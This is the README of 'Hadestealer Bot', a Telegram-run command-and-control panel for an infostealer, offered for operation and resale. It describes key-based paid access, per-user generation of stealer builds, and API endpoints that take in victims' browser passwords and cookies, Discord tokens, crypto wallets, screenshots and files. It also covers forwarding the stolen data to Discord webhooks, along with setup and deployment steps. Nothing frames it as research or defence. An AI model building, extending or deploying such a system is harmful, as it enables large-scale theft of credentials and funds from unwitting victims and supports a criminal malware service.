# Contact : https://t.me/tahammulsuz
# Stealer project : https://github.com/yanaksalvo/Hades-Stealer

# 🤖 Hadestealer Bot

Hadestealer Bot is a Telegram-based management bot connected to a C2 (Command & Control) server, featuring a key-based access system. Users gain access to the system by redeeming keys, configure Discord webhooks, and can generate customized stealer builds. Incoming data is stored in MongoDB and received via an Express.js REST API.

---

## 📁 Project Structure

```
bot/
├── ecosystem.config.js        # PM2 process manager configuration
├── package.json
├── tsconfig.json
└── src/
    ├── index.ts               # Application entry point
    ├── config.ts              # Configuration constants
    ├── api/
    │   └── Server.ts          # Express REST API server
    ├── client/
    │   └── BotClient.ts       # Telegram bot client
    ├── commands/              # Bot commands
    │   ├── BuildCommand.ts
    │   ├── CheckKeyCommand.ts
    │   ├── ClaimCommand.ts
    │   ├── CreateKeyCommand.ts
    │   ├── DeleteKeyCommand.ts
    │   ├── ListKeysCommand.ts
    │   ├── StartCommand.ts
    │   └── WebhookCommand.ts
    ├── database/
    │   └── mongo.ts           # MongoDB connection
    ├── events/
    │   └── MessageTextEvent.ts # Telegram message event handler
    ├── models/                # Mongoose schema models
    │   ├── ClaimKey.ts
    │   ├── UploadRecord.ts
    │   └── UserAccess.ts
    ├── structures/
    │   ├── Command.ts         # Base command class
    │   └── Event.ts           # Base event class
    └── utils/
        ├── getBadges.ts       # Discord badge helper
        ├── message.ts         # Message text extractor
        ├── notifyWebhook.ts   # Webhook notification formatter
        └── scheduleForward.ts # Delayed webhook forwarder
```

---

## ⚙️ Configuration

The following constants are defined in `src/config.ts`:

| Constant | Description |
|---|---|
| `OWNER_ID` | Telegram user ID of the bot owner |
| `BOT_TOKEN` | Telegram Bot API token |
| `MONGO_URI` | MongoDB connection URI |
| `API_KEY` | REST API authentication key |
| `PORT` | Port the Express server listens on |
| `emojis` | Emoji mapping for Discord badge types |

---

## 🗄️ Database Models

### `UserAccess`
Represents users who have gained access to the system.

| Field | Type | Description |
|---|---|---|
| `userId` | String | Telegram user ID |
| `username` | String | Telegram username |
| `webhook` | String | User's Discord webhook URL |
| `expiresAt` | Date | Access expiration date |
| `buildConfig` | Object | Custom build configuration |
| `apiKey` | String | User-specific API key |

### `ClaimKey`
Represents one-time access tokens used to unlock the system.

| Field | Type | Description |
|---|---|---|
| `key` | String | Unique key value |
| `duration` | Number | Access duration in days |
| `used` | Boolean | Whether the key has been used |
| `usedBy` | String | ID of the user who claimed the key |
| `usedAt` | Date | Date the key was used |
| `createdAt` | Date | Date the key was created |

### `UploadRecord`
Audit log of all uploads received from stealer clients.

| Field | Type | Description |
|---|---|---|
| `userId` | String | Associated user ID |
| `type` | String | Data type (browser, discord, wallet, etc.) |
| `data` | Mixed | Uploaded payload |
| `timestamp` | Date | Upload timestamp |

---

## 💬 Bot Commands

### User Commands

| Command | Description |
|---|---|
| `/start` | Starts the bot and displays a welcome message |
| `/claim <key>` | Redeems an access key to join the system |
| `/webhook <url>` | Saves or updates the user's Discord webhook URL |
| `/build` | Generates and sends a personalized stealer build |

### Owner Commands (Only for `OWNER_ID`)

| Command | Description |
|---|---|
| `/createkey <days>` | Creates a new access key for the specified duration |
| `/listkeys` | Lists all keys (used and unused) |
| `/checkkey <key>` | Queries the status of a specific key |
| `/deletekey <key>` | Deletes a specific key |

---

## 🌐 REST API Endpoints

All requests require authentication via the `X-API-KEY` header.

**Base URL:** `http://localhost:<PORT>`

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/health` | Server health check |
| `POST` | `/discord` | Receives Discord account data |
| `POST` | `/browser` | Uploads browser data (passwords, cookies, etc.) |
| `POST` | `/wallet` | Uploads cryptocurrency wallet data |
| `POST` | `/screenshot` | Uploads a screenshot |
| `POST` | `/sysinfo` | Uploads system information |
| `POST` | `/inject` | Receives Discord injection data |
| `POST` | `/log` | Receives a generic log message |
| `POST` | `/error` | Receives an error report |
| `POST` | `/files` | Receives file uploads |

---

## 🛠️ Utility Functions

### `getBadges(flags: number): string`
Converts Discord user flag bitmasks into emoji badge representations.  
Examples: `HypeSquad`, `Early Supporter`, `Bug Hunter`, etc.

### `message(ctx): string`
Safely extracts the message text from a Telegram context object.

### `notifyWebhook(data, webhookUrl)`
Formats stealer data into Discord embed format and sends it to the configured webhook URL.

### `scheduleForward(data, webhookUrl, delayMs)`
Forwards a webhook notification after a specified delay.

---

## 🚀 Setup & Running

### Requirements

- Node.js 18+
- MongoDB
- PM2 (optional, for production)

### Steps

```bash
# Install dependencies
cd bot
npm install

# Compile TypeScript
npm run build

# Run in development mode
npm run dev

# Run in production mode with PM2
pm2 start ecosystem.config.js
```

### `ecosystem.config.js` (PM2)

```js
module.exports = {
  apps: [{
    name: "hadestealer-bot",
    script: "dist/index.js",
    watch: false,
    env: {
      NODE_ENV: "production"
    }
  }]
}
```

---

## 📦 Dependencies

| Package | Description |
|---|---|
| `telegraf` | Telegram Bot API framework |
| `mongoose` | MongoDB ODM |
| `express` | REST API server |
| `axios` | HTTP client |
| `multer` | Multipart file upload handling |
| `typescript` | Type-safe development |
| `ts-node` | TypeScript runtime |

---

## 📋 Development Notes

- All commands extend the base `src/structures/Command.ts` class.
- All events extend the base `src/structures/Event.ts` class.
- `BotClient` automatically loads commands and events at startup.
- The API server and Telegram bot run concurrently.
- Owner commands are protected by a `userId === OWNER_ID` check.
